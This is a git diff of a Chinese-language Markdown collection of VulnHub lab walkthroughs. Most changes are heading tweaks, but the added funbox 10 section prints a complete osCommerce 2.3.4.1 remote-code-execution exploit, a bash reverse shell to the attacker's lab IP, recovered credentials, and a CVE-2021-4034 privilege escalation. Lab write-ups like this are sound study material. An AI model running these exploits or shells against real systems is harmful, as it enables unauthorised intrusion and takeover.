@@ -126,18 +126,18 @@ http://10.0.2.10/
 
 # funbox 1
 
-**本机ip：**
+## **本机ip：**
 
 ~~~
 10.0.2.11 
 ~~~
-**靶机ip：**
+## **靶机ip：**
 
 ~~~
 10.0.2.15
 ~~~
 
-**信息收集：**
+## **信息收集：**
 
 端口
 
@@ -164,7 +164,7 @@ http://10.0.2.10/
 
 
 
-**漏洞利用**：
+## **漏洞利用**：
 
 ~~~
 python -c 'import pty;pty.spawn("/bin/bash");'
@@ -180,7 +180,7 @@ python -c 'import pty;pty.spawn("/bin/bash");'
 
 
 
-**权限提升：**
+## **权限提升：**
 
 >  ssh joe@10.0.2.15  
 >
@@ -192,19 +192,19 @@ python -c 'import pty;pty.spawn("/bin/bash");'
 
 # Corrosion: 2
 
-**本机ip**
+## **本机ip**
 
 ~~~
 192.168.59.10
 ~~~
 
-**靶机ip**
+## **靶机ip**
 
 ~~~
 192.168.59.19
 ~~~
 
-**信息收集：**
+## **信息收集：**
 
 > Discovered open port 22/tcp on 192.168.59.19
 > Discovered open port 8080/tcp on 192.168.59.19
@@ -255,7 +255,7 @@ msfvenom -p java/jsp_shell_reverse_tcp  LPORT=6666 LHOST=192.168.59.10 -f war > 
 
 
 
-**漏洞利用：**
+## **漏洞利用：**
 
 ~~~
 python3 -c 'import pty;pty.spawn("/bin/bash");'
@@ -303,7 +303,7 @@ john randyhash --wordlist=/usr/share/wordlists/rockyou.txt
 
 
 
-**权限提升：**
+## **权限提升：**
 
 **上传linpeas.sh脚本**
 
@@ -320,3 +320,147 @@ https://github.com/berdav/CVE-2021-4034
 CVE-2022-0847脚本执行失败
 
 >  /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found 
+
+# funbox 10
+
+## **本机ip**
+
+~~~
+10.0.2.4
+~~~
+
+## **靶机ip**
+
+~~~
+10.0.2.16
+
+~~~
+
+## **信息收集**
+
+> 22/tcp  open  ssh     syn-ack ttl 64
+> 25/tcp  open  smtp    syn-ack ttl 64
+> 80/tcp  open  http    syn-ack ttl 64
+> 110/tcp open  pop3    syn-ack ttl 64
+> 143/tcp open  imap    syn-ack ttl 64
+
+
+
+![image-20220824135204082](vulnhub靶场.assets/image-20220824135204082.png)
+
+![image-20220824135230883](vulnhub靶场.assets/image-20220824135230883.png)
+
+**搜索cms漏洞**
+
+`searchsploit osCommerce`
+
+![image-20220824135357807](vulnhub靶场.assets/image-20220824135357807.png)
+
+
+
+
+
+
+
+
+
+## **漏洞利用**
+
+~~~
+ searchsploit -m php/webapps/44374.py
+~~~
+
+查看exp内容：
+
+~~~python
+# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
+# Date: 29.0.3.2018
+# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
+# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
+# Tested on: Linux, Windows
+
+# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
+# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
+# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
+# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
+# PHP code into the config file and then simply executing the code by opening it.
+
+
+import requests
+
+# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
+base_url = "http://10.0.2.16/catalog/"
+target_url = "http://10.0.2.16/catalog/install/install.php?step=4"
+
+data = {
+    'DIR_FS_DOCUMENT_ROOT': './'
+}
+
+# the payload will be injected into the configuration file via this code
+# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
+# so the format for the exploit will be: '); PAYLOAD; /*
+
+payload = '\');'
+payload += 'system("ls");'    # this is where you enter you PHP payload
+payload += '/*'
+
+data['DB_DATABASE'] = payload
+
+# exploit it
+r = requests.post(url=target_url, data=data)
+
+if r.status_code == 200:
+    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
+else:
+    print("[-] Exploit did not execute as planned")
+
+~~~
+
+![image-20220824140152980](vulnhub靶场.assets/image-20220824140152980.png)
+
+![image-20220824140855812](vulnhub靶场.assets/image-20220824140855812.png)
+
+>   define('DB_SERVER_USERNAME', 'jack');
+>   define('DB_SERVER_PASSWORD', 'yellow');
+
+> joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
+>
+>  jack:x:1001:1001:,,,:/home/jack:/bin/bash
+>
+>  chuck:x:1002:1002:,,,:/home/chuck:/bin/bash 
+>
+> susan:x:1003:1003:,,,:/home/susan:/bin/bash 
+
+**反弹shell**
+
+`bash -c '/bin/bash -i >& /dev/tcp/10.0.2.4/9090 0>&1'`
+
+![image-20220824143957358](vulnhub靶场.assets/image-20220824143957358.png)
+
+
+
+
+
+
+
+## **权限提升**
+
+**方法一**
+
+>  **CVE-2021-4034脚本可以直接提权成功**
+
+**方法二**
+
+
+
+pspy程序扫描出 一个异常文件
+
+![image-20220824164713934](vulnhub靶场.assets/image-20220824164713934.png)
+
+> base64:
+>
+> -u root -p rfvbgt!!
+
+知道账号密码 ，直接su 提权成功
+
+![image-20220824164951223](vulnhub靶场.assets/image-20220824164951223.png)
